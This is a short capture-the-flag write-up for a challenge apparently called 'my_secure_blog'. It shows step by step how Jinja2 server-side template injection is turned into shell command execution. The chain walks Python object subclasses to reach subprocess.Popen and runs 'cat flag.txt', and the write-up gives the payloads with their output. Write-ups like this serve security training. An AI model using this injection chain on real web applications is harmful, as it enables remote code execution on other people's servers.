# my_secure_blog

### Solution

We can test for render_template_string using `{{7*7}}` and seeing if it returns 49.
Process for exploitation is shown below.

```python
{{''.__class__}}

#class of blank string
<class 'str'>
```

```python
{{''.__class__.__mro__}}
#inherited classes
(<class 'str'>, <class 'object'>)
```

```python
{{''.__class__.__mro__[1].__subclasses__()}}
#subclasses of object
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'> ...
```

Looking for the subprocess.Popen object, we can execute shell commands such as `cat flag.txt`

```python
{{''.__class__.__mro__[1].__subclasses__()[250]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip()}}

b'flag{TBD}'
```